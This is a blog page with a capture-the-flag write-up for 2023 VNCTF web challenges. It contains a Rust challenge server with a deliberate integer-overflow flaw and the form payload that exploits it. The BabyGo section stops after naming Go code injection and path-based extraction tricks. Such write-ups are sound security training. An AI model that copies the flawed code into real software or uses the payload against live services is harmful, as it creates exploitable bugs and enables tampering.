@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="2023VNCTF Web" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            2023VNCTF Web
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90"><span class="post-toc-text">象棋王子</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#%E7%94%B5%E5%AD%90%E6%9C%A8%E9%B1%BC"><span class="post-toc-text">电子木鱼</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#BabyGo"><span class="post-toc-text">BabyGo</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="post-toc-text">0x00 前言</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="post-toc-text">0x01 源码分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E9%A2%98%E8%A7%A3"><span class="post-toc-text">0x02 题解</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="post-toc-text">方法一 代码注入</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-%E4%BD%BF%E7%94%A8%E5%88%AB%E5%90%8D%E6%89%A7%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84%E5%8C%85"><span class="post-toc-text">方法二 使用别名执行自己的包</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x03-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="post-toc-text">0x03 参考文章</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><p>比赛的时候在回学校的路上，所以没有打，听说质量挺高，赛后做一下</p>
+<h1 id="象棋王子"><a href="#象棋王子" class="headerlink" title="象棋王子"></a>象棋王子</h1><p>一个普通的js游戏，玩过关了就给flag，所以flag肯定在前端源码里</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508972.png" title="image-20230219150751192" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508972.png" alt="image-20230219150751192"></a></p>
+<p>这里就是弹flag的js，只不过被混淆了，直接复制到控制台执行就行</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508558.png" title="image-20230219150828450" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302191508558.png" alt="image-20230219150828450"></a></p>
+<h1 id="电子木鱼"><a href="#电子木鱼" class="headerlink" title="电子木鱼"></a>电子木鱼</h1><p>一个整数溢出</p>
+<p>源码</p>
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> actix_files::Files;</span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;</span><br><span class="line">    error, get, post,</span><br><span class="line">    web::&#123;<span class="keyword">self</span>, Json&#125;,</span><br><span class="line">    App, Error, HttpResponse, HttpServer,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> once_cell::sync::Lazy;</span><br><span class="line"><span class="keyword">use</span> serde::&#123;Deserialize, Serialize&#125;;</span><br><span class="line"><span class="keyword">use</span> std::sync::&#123;Arc, Mutex&#125;;</span><br><span class="line"><span class="keyword">use</span> tera::&#123;Context, Tera&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> GONGDE: Lazy&lt;ThreadLocker&lt;<span class="type">i32</span>&gt;&gt; = Lazy::<span class="title function_ invoke__">new</span>(|| ThreadLocker::<span class="title function_ invoke__">from</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Clone, Default)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ThreadLocker</span>&lt;T&gt; &#123;</span><br><span class="line">    value: Arc&lt;Mutex&lt;T&gt;&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T: <span class="built_in">Clone</span>&gt; ThreadLocker&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">get</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> T &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">mutex</span> = <span class="keyword">self</span>.value.<span class="title function_ invoke__">lock</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        mutex.<span class="title function_ invoke__">clone</span>()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">set</span>(&amp;<span class="keyword">self</span>, val: T) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">mutex</span> = <span class="keyword">self</span>.value.<span class="title function_ invoke__">lock</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        *mutex = val;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">from</span>(val: T) <span class="punctuation">-&gt;</span> ThreadLocker&lt;T&gt; &#123;</span><br><span class="line">        ThreadLocker::&lt;T&gt; &#123;</span><br><span class="line">            value: Arc::<span class="title function_ invoke__">new</span>(Mutex::<span class="title function_ invoke__">new</span>(val)),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Serialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APIResult</span> &#123;</span><br><span class="line">    success: <span class="type">bool</span>,</span><br><span class="line">    message: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Deserialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Info</span> &#123;</span><br><span class="line">    name: <span class="type">String</span>,</span><br><span class="line">    quantity: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[derive(Debug, Copy, Clone, Serialize)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Payload</span> &#123;</span><br><span class="line">    name: &amp;<span class="symbol">&#x27;static</span> <span class="type">str</span>,</span><br><span class="line">    cost: <span class="type">i32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> PAYLOADS: &amp;[Payload] = &amp;[</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Cost&quot;</span>,</span><br><span class="line">        cost: <span class="number">10</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Loan&quot;</span>,</span><br><span class="line">        cost: -<span class="number">1_000</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;CCCCCost&quot;</span>,</span><br><span class="line">        cost: <span class="number">500</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Donate&quot;</span>,</span><br><span class="line">        cost: <span class="number">1</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">    Payload &#123;</span><br><span class="line">        name: <span class="string">&quot;Sleep&quot;</span>,</span><br><span class="line">        cost: <span class="number">0</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">index</span>(tera: web::Data&lt;Tera&gt;) <span class="punctuation">-&gt;</span> <span class="type">Result</span>&lt;HttpResponse, Error&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">context</span> = Context::<span class="title function_ invoke__">new</span>();</span><br><span class="line"></span><br><span class="line">    context.<span class="title function_ invoke__">insert</span>(<span class="string">&quot;gongde&quot;</span>, &amp;GONGDE.<span class="title function_ invoke__">get</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &gt; <span class="number">1_000_000_000</span> &#123;</span><br><span class="line">        context.<span class="title function_ invoke__">insert</span>(</span><br><span class="line">            <span class="string">&quot;flag&quot;</span>,</span><br><span class="line">            &amp;std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;FLAG&quot;</span>).<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;flag&#123;test_flag&#125;&quot;</span>.<span class="title function_ invoke__">to_string</span>()),</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">match</span> tera.<span class="title function_ invoke__">render</span>(<span class="string">&quot;index.html&quot;</span>, &amp;context) &#123;</span><br><span class="line">        <span class="title function_ invoke__">Ok</span>(body) =&gt; <span class="title function_ invoke__">Ok</span>(HttpResponse::<span class="title function_ invoke__">Ok</span>().<span class="title function_ invoke__">body</span>(body)),</span><br><span class="line">        <span class="title function_ invoke__">Err</span>(err) =&gt; <span class="title function_ invoke__">Err</span>(error::<span class="title function_ invoke__">ErrorInternalServerError</span>(err)),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[get(<span class="string">&quot;/reset&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">reset</span>() <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    GONGDE.<span class="title function_ invoke__">set</span>(<span class="number">0</span>);</span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">true</span>,</span><br><span class="line">        message: <span class="string">&quot;重开成功，继续挑战佛祖吧&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[post(<span class="string">&quot;/upgrade&quot;</span>)]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">upgrade</span>(body: web::Form&lt;Info&gt;) <span class="punctuation">-&gt;</span> Json&lt;APIResult&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;功德都搞成负数了，佛祖对你很失望&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> body.quantity &lt;= <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">            success: <span class="literal">false</span>,</span><br><span class="line">            message: <span class="string">&quot;佛祖面前都敢作弊，真不怕遭报应啊&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Some</span>(payload) = PAYLOADS.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">find</span>(|u| u.name == body.name) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">cost</span> = payload.cost;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> || payload.name == <span class="string">&quot;Cost&quot;</span> &#123; <span class="comment">//只有这两个会给cost翻倍数</span></span><br><span class="line">            cost *= body.quantity;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> GONGDE.<span class="title function_ invoke__">get</span>() &lt; cost <span class="keyword">as</span> <span class="type">i32</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">false</span>,</span><br><span class="line">                message: <span class="string">&quot;功德不足&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> cost != <span class="number">0</span> &#123;</span><br><span class="line">            GONGDE.<span class="title function_ invoke__">set</span>(GONGDE.<span class="title function_ invoke__">get</span>() - cost <span class="keyword">as</span> <span class="type">i32</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> payload.name == <span class="string">&quot;Cost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;小扣一手功德&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;CCCCCost&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;功德都快扣没了，怎么睡得着的&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Loan&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;我向佛祖许愿，佛祖借我功德，快说谢谢佛祖&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Donate&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;好人有好报&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> payload.name == <span class="string">&quot;Sleep&quot;</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">                success: <span class="literal">true</span>,</span><br><span class="line">                message: <span class="string">&quot;这是什么？床，睡一下&quot;</span>,</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    web::<span class="title function_ invoke__">Json</span>(APIResult &#123;</span><br><span class="line">        success: <span class="literal">false</span>,</span><br><span class="line">        message: <span class="string">&quot;禁止开摆&quot;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#[actix_web::main]</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">fn</span> <span class="title function_">main</span>() <span class="punctuation">-&gt;</span> std::io::<span class="type">Result</span>&lt;()&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">port</span> = std::env::<span class="title function_ invoke__">var</span>(<span class="string">&quot;PORT&quot;</span>)</span><br><span class="line">        .<span class="title function_ invoke__">unwrap_or_else</span>(|_| <span class="string">&quot;2333&quot;</span>.<span class="title function_ invoke__">to_string</span>())</span><br><span class="line">        .<span class="title function_ invoke__">parse</span>()</span><br><span class="line">        .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Invalid PORT&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Listening on 0.0.0.0:&#123;&#125;&quot;</span>, port);</span><br><span class="line"></span><br><span class="line">    HttpServer::<span class="title function_ invoke__">new</span>(<span class="keyword">move</span> || &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">tera</span> = <span class="keyword">match</span> Tera::<span class="title function_ invoke__">new</span>(<span class="string">&quot;src/templates/**/*.html&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(t) =&gt; t,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(e) =&gt; &#123;</span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;Error: &#123;&#125;&quot;</span>, e);</span><br><span class="line">                ::std::process::<span class="title function_ invoke__">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        App::<span class="title function_ invoke__">new</span>()</span><br><span class="line">            .<span class="title function_ invoke__">app_data</span>(web::Data::<span class="title function_ invoke__">new</span>(tera))</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(Files::<span class="title function_ invoke__">new</span>(<span class="string">&quot;/asset&quot;</span>, <span class="string">&quot;src/templates/asset/&quot;</span>).<span class="title function_ invoke__">prefer_utf8</span>(<span class="literal">true</span>))</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(index)</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(upgrade)</span><br><span class="line">            .<span class="title function_ invoke__">service</span>(reset)</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_ invoke__">bind</span>((<span class="string">&quot;0.0.0.0&quot;</span>, port))?</span><br><span class="line">    .<span class="title function_ invoke__">run</span>()</span><br><span class="line">    .<span class="keyword">await</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>i32的范围是-2147483648到2147483647，所以只要在Cost那将减的数量变成大于2147483648，就可以造成溢出，从而得到flag</p>
+<p>在<code>/upgrade</code>路由</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=Cost&amp;quantity=214748365</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302211113243.png" title="image-20230221111324074" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202302211113243.png" alt="image-20230221111324074"></a></p>
+<h1 id="BabyGo"><a href="#BabyGo" class="headerlink" title="BabyGo"></a>BabyGo</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这题在机场等同学的时候做了一下，但是那个解压功能一直报错，我还以为是我的问题，结构第二天做一下发现是可以的</p>
+<ul>
+<li>goeval代码注入</li>
+<li>filepath.Clean构造任意解压路径</li>
+</ul>
